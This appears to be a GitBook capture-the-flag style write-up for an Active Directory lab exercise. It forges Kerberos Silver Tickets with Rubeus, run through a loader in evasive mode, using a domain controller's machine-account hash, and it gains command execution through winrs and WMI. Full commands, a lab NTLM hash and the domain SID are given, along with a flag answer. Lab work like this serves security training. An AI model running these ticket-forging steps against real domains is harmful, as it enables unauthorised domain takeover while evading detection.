---
icon: vial
---

# 9 - Learning Object9️

## Tasks



1 - Try to get command execution on the domain controller by creating silver ticket for:

* HTTP
* WMI

Flag 18 \[dcorp-dc] - The service whose Silver Ticket can be used for winrs or PowerShell Remoting 🚩



## Solutions

### 1 - Try to get command execution on the domain controller by creating silver ticket for:

Based on the last task we already have the hash for the machine account of the domain controller (dcorp-dc$).&#x20;

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

```powershell
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : e4ce16e20da2e11d2901e0fb8a4f28b0
```

#### HTTP

We can create a Silver Ticket that provides us access to the HTTP service (WinRM) on DC:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:e4ce16e20da2e11d2901e0fb8a4f28b0 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

We can check if we got the correct service ticket:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

And run `klist` or  `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist` we can see it

`http/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL`

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

let's try accessing it using winrs. Note that we are using FQDN of dcorp-dc as that is what the service ticket has:

```powershell
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
set username
set computername
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

#### WMI

For accessing WMI, we need to create two tickets: one for HOST service and another for RPCSS.

We can start to run the following commands from an elevated shell:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

Verify that tickets generated are present:

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

let's try to use WMI commands on the domain controller:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

### Flag 18 \[dcorp-dc] - The service whose Silver Ticket can be used for winrs or PowerShell Remoting 🚩

As we can see in the previous task the **HTTP** service can be used for winrs or PowerShell Remoting.
